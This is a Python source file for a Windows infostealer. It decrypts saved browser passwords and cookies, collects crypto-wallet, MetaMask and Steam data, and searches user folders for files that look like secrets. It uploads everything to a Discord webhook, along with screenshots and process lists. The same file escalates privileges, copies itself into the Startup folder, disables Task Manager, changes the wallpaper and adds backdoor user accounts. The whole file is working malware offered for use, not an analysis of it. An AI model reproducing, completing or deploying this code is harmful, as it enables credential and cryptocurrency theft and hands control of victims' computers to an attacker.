import os
import threading
import re
import random
import subprocess
import time
import ntpath
import json
import shutil
import webbrowser
import tkinter
import wmi
import winreg
import platform
import httpx
import sys
import numpy as np
import multiprocessing
import math
import pyautogui
import requests
import win32com.shell.shell as shell
import socket
import psutil
import io
import ctypes

from os import getenv, system, name, listdir
from tempfile import gettempdir, mkdtemp
from fileinput import filename
from discord import Embed, File, SyncWebhook
from os.path import isfile
from random import choice
from urllib import request
from sys import argv
from sys import executable
from tkinter import messagebox
from shutil import copy
from os.path import isdir, isfile
from sqlite3 import connect as sql_connect
from os import getenv, listdir, startfile
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import loads, dumps
from zipfile import ZipFile

ASADMIN = 'asadmin'

if sys.argv[-1] != ASADMIN:
    script = os.path.abspath(sys.argv[0])
    params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
    shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
    sys.exit(0)

hook = "" #webhook
color = 0x00adff

DETECTED = False


requirements = [
    ["requests", "requests"],
    ["Crypto.Cipher", "pycryptodome"],
    ["uplink", "uplink"],
    ["wmi", "wmi"],
    ["httpx", "httpx"],
    ["alive-progress", "alive-progress"],
    ["psutil", "psutil"],
    ["cryptography", "cryptography"],
    ["pypiwin32", "pypiwin32"],
    ["Pillow", "Pillow"],
    ["copy", "copy"],
    ["webbrowser", "webbrowser"],
    ["lowmovers", "lowmovers"],

]

import requests
from Crypto.Cipher import AES

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
Threadlist = []


class DATA_BLOB(Structure):
     _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def G3tD4t4(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return G3tD4t4(blob_out)

def D3kryptV4lU3(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

def L04dR3qu3sTs(methode, url, data='', files='', headers=''):
    for i in range(8):
        try:
            if methode == 'POST':
                if data != '':
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
                elif files != '':
                    r = requests.post(url, files=files)
                    if r.status_code == 200 or r.status_code == 413: # 413 = DATA TO BIG
                        return r
        except:
            pass

def L04durl1b(hook, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(hook, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(hook, data=data))
                return r
        except:
            pass


def TR6st(Cookies):
    global DETECTED
    data = str(Cookies)
    tim = re.findall(".google.com", data)
    # print(len(tim))
    if len(tim) < -1:
        DETECTED = True
        return DETECTED
    else:
        DETECTED = False
        return DETECTED


def R4f0rm3t(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def upload(name, tk=''):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    if name == "kiwi":
        data = {
        "content": '',
        "embeds": [
            {
            "color": color,
            }
        ],
        "avatar_url": "https://media.discordapp.net/attachments/1056251666808180779/1056280325292048484/Darahan_on_Twitter.jpg?width=630&height=630",
        "attachments": []
        }
        L04durl1b(hook, data=dumps(data).encode(), headers=headers)
        return

    path = name
    files = {'file': open(path, 'rb')}
    # print(f"FILE= {files}")

    if "passw" in name:

        ra = ' | '.join(da for da in paswWords)

        if len(ra) > 1000:
            rrr = R4f0rm3t(str(paswWords))
            ra = ' | '.join(da for da in rrr)

    if "cook" in name:
        rb = ' | '.join(da for da in cookiWords)
        if len(rb) > 1000:
            rrrrr = R4f0rm3t(str(cookiWords))
            rb = ' | '.join(da for da in rrrrr)


    L04dR3qu3sTs("POST", hook, files=files)
                                        
def wr1tef0rf1l3(data, name):
    path = os.getenv("TEMP") + f"\{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

P4ssw = []
def getP4ssw(path, arg):
    global P4ssw
    if not os.path.exists(path): return

    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0: return

    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data:
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in paswWords: paswWords.append(old)
            P4ssw.append(f"URL: {row[0]} | US3RN4ME: {row[1]} | P4SSW0RD: {D3kryptV4lU3(row[2], master_key)}")
        # print([row[0], row[1], DecryptValue(row[2], master_key)])
    wr1tef0rf1l3(P4ssw, 'passw')

C00k13 = []    
def getC00k13(path, arg):
    global C00k13, CookiCount
    if not os.path.exists(path): return
    
    pathC = path + arg + "/Cookies"
    if os.stat(pathC).st_size == 0: return
    
    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"

    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data:
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in cookiWords: cookiWords.append(old)
            C00k13.append(f"HOST KEY: {row[0]} | NAME: {row[1]} | VALUE: {D3kryptV4lU3(row[2], master_key)}")
    wr1tef0rf1l3(C00k13, 'cook')

def Z1pTh1ngs(path, arg, procc):
    pathC = path
    name = arg

    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_{browser}"
        pathC = path + arg

    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)

    if "Wallet" in arg or "NationsGlory" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False: return
        name = arg

    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file: zf.write(pathC + "/" + file)
    zf.close()

    upload(f'{pathC}/{name}.zip')
    os.remove(f"{pathC}/{name}.zip")


def GatherAll():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
    browserPaths = [
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
    ]

    discordPaths = [
        [f"{roaming}/Discord", "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
    ]

    PathsToZip = [
        [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"]
    ]

    for patt in browserPaths:
        a = threading.Thread(target=getP4ssw, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)

    ThCokk = []
    for patt in browserPaths:
        a = threading.Thread(target=getC00k13, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

    for thread in ThCokk: thread.join()
    DETECTED = TR6st(C00k13)
    if DETECTED == True: return

    for patt in browserPaths:
        threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[5], patt[1]]).start()

    for patt in PathsToZip:
        threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[2], patt[1]]).start()

    for thread in Threadlist:
        thread.join()
    global upths
    upths = []

    for file in ["passw.txt", "cook.txt"]:
        upload(os.getenv("TEMP") + "\\" + file)

def KiwiFolder(pathF, keywords):
    global KiwiFiles
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file): return
        i += 1
    KiwiFiles.append(["folder", pathF + "/", ffound])

KiwiFiles = []
def KiwiFile(path, keywords):
    global KiwiFiles
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    KiwiFolder(target, keywords)
                    break

    KiwiFiles.append(["folder", path, fifound])

def Kiwi():
    user = temp.split("\AppData")[0]
    path2search = [
        user + "/Desktop",
        user + "/Downloads",
        user + "/Documents",
    ]

    key_wordsFolder = [
        "account",
        "acount",
        "passw",
        "secret",
        "senhas",
        "contas",
        "backup",
        "2fa",
        "importante",
        "privado",
        "exodus",
        "exposed",
        "perder",
        "amigos",
        "empresa",
        "trabalho",
        "work",
        "private",
        "source",
        "users",
        "username",
        "login",
        "user",
        "usuario",
        "log"
    ]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "banque",
        "account",
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord", 
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "seecret",
        "contas",
        "senha",
        "senhas",
        "email",
        "steam",
        "trabalho",
        "privado",
        "private",
        "source"
        ]

    wikith = []
    for patt in path2search:
        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()
        wikith.append(kiwi)
    return wikith


global keyword, cookiWords, paswWords

keyword = [
    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)', '[github](https://github.com)', '[solo.to](https://solo.to)', '[kabum](https://www.kabum.com.br)', '[cb](https://www.casasbahia.com.br)', '[mercadopago](https://www.mercadopago.com.br)', '[mercadolivre](https://www.mercadolivre.com.br)', '[americanas](https://www.americanas.com.br)', '[adidas](https://www.adidas.com.br)', '[mediafire](https://www.mediafire.com)', '[blaze](https://blaze.com)', '[betano](https://br.betano.com)', '[pixbet](https://pixbet.com)', '[betfair](https://www.betfair.com),'
]


cookiWords = []
paswWords = []

GatherAll()
DETECTED = TR6st(C00k13)
if not DETECTED:
    wikith = Kiwi()

    for thread in wikith: thread.join()
    time.sleep(0.2)

    filetext = "\n"
    for arg in KiwiFiles:
        if len(arg[2]) != 0:
            foldpath = arg[1]
            foldlist = arg[2]       
            filetext += f"📁 {foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a)-1]
                b = ffil[1]
                filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
            filetext += "\n"
    upload("kiwi", filetext)



def take_screenshot():
    # Take a screenshot using pyautogui
    screenshot = pyautogui.screenshot()
    return screenshot

def save_screenshot_temp():
    # Take a screenshot
    screenshot = take_screenshot()

    # Save the screenshot in the Windows %temp% folder
    temp_folder = os.environ.get('TEMP')
    screenshot_path = os.path.join(temp_folder, 'screenshot.png')
    screenshot.save(screenshot_path, format='PNG')

    return screenshot_path

def send_screenshot(webhook_url):
    # Save the screenshot in the Windows %temp% folder
    screenshot_path = save_screenshot_temp()

    # Create a POST request with the screenshot file to the Discord webhook URL
    files = {
        'file': open(screenshot_path, 'rb')
    }
    payload = {
        'content': 'New screenshot!'
    }
    response = requests.post(webhook_url, data=payload, files=files)

# Replace 'YOUR_WEBHOOK_URL' with your actual Discord webhook URL
webhook_url = ''

# Call the function to take the screenshot, save it in the %temp% folder, and send it to Discord
send_screenshot(webhook_url)

def get_downloads_files():
    downloads_folder = os.path.expanduser('~/Downloads')
    files = os.listdir(downloads_folder)
    return files

def save_downloads_files_temp():
    files = get_downloads_files()
    temp_folder = os.environ.get('TEMP')
    downloads_path = os.path.join(temp_folder, 'downloads.txt')

    with open(downloads_path, 'w') as f:
        for file in files:
            f.write(f'{file}\n')

    return downloads_path

def send_downloads_files(webhook_url):
    downloads_path = save_downloads_files_temp()

    files = {
        'file': open(downloads_path, 'r')
    }
    payload = {
        'content': 'List of downloaded files:'
    }
    response = requests.post(webhook_url, data=payload, files=files)

    if response.status_code == 200:
        print("Downloaded files list sent successfully!")
    else:
        print("Failed to send downloaded files list.")

webhook_url = ''
send_downloads_files(webhook_url)

def startup_and_disable_taskmgr():
    script_dir = os.path.dirname(os.path.realpath(sys.argv[0]))
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    startup_script = os.path.join(startup_folder, "1337.exe")
    shutil.copyfile(sys.argv[0], startup_script)

    os.system('powershell.exe REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f')

# Call the function to copy the script to the startup folder and disable Task Manager
startup_and_disable_taskmgr()

def tasks():
    # Get the running tasks
    running_tasks = []
    for proc in psutil.process_iter(['pid', 'name', 'exe']):
        task_info = {
            'name': proc.info['name'],
            'extension': os.path.splitext(proc.info['exe'])[1] if proc.info['exe'] else '.exe',
            'pid': proc.info['pid']
        }
        running_tasks.append(task_info)

    # Save the task information to a text file
    output_path = os.path.join(os.environ['TEMP'], 'task-list.txt')
    with open(output_path, 'w') as file:
        for task in running_tasks:
            file.write(f"Name: {task['name']}\n")
            file.write(f"Extension: {task['extension']}\n")
            file.write(f"PID: {task['pid']}\n")
            file.write("\n")

    # Send the file through Discord webhook
    webhook_url = ''
    files = {'file': open(output_path, 'rb')}
    response = requests.post(webhook_url, files=files)
    
tasks()

def set_wallpaper_from_discord():
    # Discord custom image link
    discord_image_url = 'https://cdn.discordapp.com/attachments/1109384405744631838/1109384478624854016/20230520_093723.png'

    # Path to save the downloaded image
    image_path = os.path.join(os.getenv('TEMP'), 'wallpaper.jpg')

    # Download the image from the Discord link
    response = requests.get(discord_image_url)

    if response.status_code == 200:
        with open(image_path, 'wb') as file:
            file.write(response.content)

    # Function to change the wallpaper
    def set_wallpaper(image_path):
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 3)

    # Set the downloaded image as the wallpaper
    set_wallpaper(image_path)

set_wallpaper_from_discord()

def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        return output.strip()
    except subprocess.CalledProcessError as e:
        # Command execution failed
        error_message = f"Command execution failed with error code {e.returncode}:\n{e.output.strip()}"
        return error_message

command_to_execute = "net user 1337-VIRUS{0} 1337 /ADD"

for i in range(1, 10):
    username = f"{i}"
    output = execute_command(command_to_execute.format(username))
    print(output)